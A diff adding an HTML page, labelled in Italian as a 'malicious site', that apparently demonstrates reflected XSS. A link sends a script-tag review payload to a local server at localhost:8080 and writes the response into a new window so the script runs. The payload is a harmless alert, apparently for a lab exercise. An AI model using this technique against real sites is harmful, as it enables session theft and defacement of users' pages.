@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Sito malevolo</title>
+</head>
+<body>
+
+<a href="#" id="reviewLink">Clicca qui per reflected XSS</a>
+
+<script>
+
+// Listener per il link a reflected XSS (POST della recensione)
+document.getElementById('reviewLink').addEventListener('click', function(event) {
+  event.preventDefault(); 
+  
+  var reviewValue = '<script>alert("ciao");<\/script>';
+  
+  fetch('http://localhost:8080/review', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    body: 'review=' + reviewValue
+  })
+  .then(response => response.text()) 
+  .then(html => {
+    // Apri nuova finestra con html di risposta
+    var newWindow = window.open();
+    newWindow.document.write(html);
+  })
+  .catch(error => {
+    console.error('Error:', error);
+  });
+});
+</script>
+
+</body>
+</html>
